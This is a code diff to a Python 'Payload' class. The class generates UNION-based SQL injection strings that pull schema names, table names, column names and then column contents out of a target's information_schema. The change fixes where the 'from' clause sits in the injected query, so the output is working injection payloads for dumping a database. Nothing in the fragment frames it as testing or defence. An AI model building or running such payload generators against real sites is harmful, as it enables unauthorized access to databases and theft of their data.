@@ -23,34 +23,34 @@ class Payload():
             list3 = []
             for i in range(num1):
                 if i == num2-1:
-                    list3.append('group_concat(schema_name) from information_schema.schemata')
+                    list3.append('group_concat(schema_name) ')
                 else:
                     list3.append(i)
             list1 = [str(i) for i in list3]
             list2 = ', '.join(list1)
-            return self.pre_payload + ' and 1=2 union select '+list2+' # '
+            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.schemata  -- '
 
         elif table_name == '':
             list3 = []
             for i in range(num1):
                 if i == num2-1:
-                    list3.append('group_concat(table_name) from information_schema.tables where table_schema = \'' +schema_name+'\'')
+                    list3.append('group_concat(table_name) ')
                 else:
                     list3.append(i)
             list1 = [str(i) for i in list3]
             list2 = ','.join(list1)
-            return self.pre_payload + ' and 1=2 union select '+list2+' --+'
+            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.tables where table_schema = \'' +schema_name + '\'--+'
 
         elif len(column_name) == 0:
             list3 = []
             for i in range(num1):
                 if i == num2-1:
-                    list3.append('group_concat(column_name) from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+table_name+'\'')
+                    list3.append('group_concat(column_name) ')
                 else:
                     list3.append(i)
             list1 = [str(i) for i in list3]
             list2 = ','.join(list1)
-            return self.pre_payload + ' and 1=2 union select '+list2+' --+' 
+            return self.pre_payload + ' and 1=2 union select '+list2+' from information_schema.columns where table_schema = \'' +schema_name+'\' and table_name = \''+ table_name+ '\'--+' 
 
         else:
             list4 = [str(i) for i in column_name]
@@ -58,12 +58,12 @@ class Payload():
             list3 = []
             for i in range(num1):
                 if i == num2-1:
-                    list3.append('group_concat('+list5+') from '+schema_name+'.'+table_name)
+                    list3.append('group_concat('+list5+') ')
                 else:
                     list3.append(i)
             list1 = [str(i) for i in list3]
             list2 = ','.join(list1)
-            return self.pre_payload + ' and 1=2 union select '+list2+' --+'
+            return self.pre_payload + ' and 1=2 union select '+list2+' from '+schema_name+'.'+table_name + ' --+'
 
 
 
